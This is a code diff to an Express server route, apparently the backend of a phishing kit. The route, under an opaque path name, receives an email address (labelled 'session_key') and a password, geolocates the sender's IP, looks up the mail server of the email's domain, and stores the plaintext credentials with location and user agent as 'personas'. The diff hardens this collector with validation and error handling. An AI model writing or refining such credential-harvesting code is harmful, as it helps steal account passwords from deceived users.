@@ -15,75 +15,149 @@ app.use(express.static(__dirname))
 app.use(bodyParser.json()) // for parsing application/json
 app.use(bodyParser.urlencoded({ extended: true })) // for parsing application/x-www-form-urlencoded
 
+app.set("trust proxy", true);
+
 app.get("/", (req, res) => {
   res.status(200).json({ response: "Welcome, Keeps!" })
 })
 
+// Route: /UD92290
+// Purpose: Receives user credentials and session info, performs IP geolocation and MX lookup, then stores the data in the database.
 app.post("/UD92290", async (req, res) => {
   try {
-    // Get client IP
-    const ip =
-      req.headers["x-forwarded-for"]?.split(",")[0] ||
-      req.socket.remoteAddress ||
-      req.ip
+    // Safely read body
+    const { session_key, password } = req.body || {};
 
-    // Free IP geolocation API
-    const response = await axios.get(`https://ipapi.co/${ip}/json/`)
+    // Use actual request user-agent
+    const user_agent = req.headers["user-agent"] || "";
 
-    const r = response.data
-
-    const gottenAddress = {
-      ip: r.ip,
-      city: r.city,
-      region: r.region,
-      countryName: r.country_name,
-      countryCode: r.country_code,
+    // Validation
+    if (!session_key || !password) {
+      return res.status(400).json({
+        success: false,
+        message: "Missing required fields",
+      });
     }
 
-    const { session_key, password } = req.body
-    const user_agent = req.header("User-Agent")
-    const domain = session_key.split("@")[1]
+    if (
+      typeof session_key !== "string" ||
+      !session_key.includes("@")
+    ) {
+      return res.status(400).json({
+        success: false,
+        message: "Invalid email format",
+      });
+    }
 
-    console.log(gottenAddress)
+    // Extract domain
+    const domain = session_key.split("@")[1];
 
-    res.json({
-      success: true,
-      gottenAddress,
-    })
+    // Get client IP
+    let ip =
+      req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
+      req.socket?.remoteAddress ||
+      req.ip ||
+      "";
 
-    const { session_key, password } = req.body
-    const user_agent = req.header("User-Agent")
-    const domain = session_key.split("@")[1]
+    // Normalize IPv6 localhost
+    if (ip.includes("::ffff:")) {
+      ip = ip.replace("::ffff:", "");
+    }
 
-    const time = new Date().toTimeString()
-    const mx = await dnsPromises.resolveMx(`${domain}`)
+    // Fallback for local development
+    let geoIp = ip;
+    if (
+      ip === "127.0.0.1" ||
+      ip === "::1" ||
+      ip === ""
+    ) {
+      geoIp = "8.8.8.8";
+    }
 
+    // Fetch geolocation
+    const response = await axios.get(
+      `https://ipapi.co/${geoIp}/json/`,
+      {
+        timeout: 5000,
+      }
+    );
+
+    // FIX: define r
+    const r = response.data || {};
+
+    const gottenAddress = {
+      ip: r.ip || "",
+      city: r.city || "",
+      region: r.region || "",
+      countryName: r.country_name || "",
+      countryCode: r.country_code || "",
+    };
+
+    // MX lookup
+    let mx = [];
+
+    try {
+      mx = await dnsPromises.resolveMx(domain);
+    } catch (mxErr) {
+      mx = [];
+    }
+
+    // Build object
     const obj = {
       username: session_key,
-      password: password,
-      domain: domain,
-      mx: mx[0]?.exchange || "",
+      password,
+      domain,
+      mx: mx?.[0]?.exchange || "",
+
       ip: gottenAddress.ip,
       city: gottenAddress.city,
       region: gottenAddress.region,
       country_name: gottenAddress.countryName,
       country_code: gottenAddress.countryCode,
-      user_agent: user_agent,
-      time: time,
+
+      user_agent,
+
+      time: new Date().toISOString(),
+    };
+
+    // Save
+    try {
+      const added = await addPersona(obj);
+
+      if (!added) {
+        return res.status(500).json({
+          success: false,
+          message: "Failed to add persona",
+        });
+      }
+
+      return res.status(201).json({
+        success: true,
+        response: "Ok, added!",
+      });
+
+    } catch (addErr) {
+      console.error(addErr);
+
+      return res.status(500).json({
+        success: false,
+        message:
+          addErr?.message ||
+          "Error occurred while adding persona",
+      });
     }
 
-    const added = await addPersona({ ...obj })
-    if (added) return res.status(201).json({ response: "Ok, added!" })
-
   } catch (err) {
-    console.log(err)
+    console.error(err);
 
-    res.status(500).json({
+    return res.status(500).json({
       success: false,
-      message: err?.msg || "Failed to fetch geolocation",
-    })
+      message:
+        err?.message ||
+        "Failed to fetch geolocation",
+    });
   }
-})
+});
 
 app.listen(PORT, (err) => {
   if (err) throw err
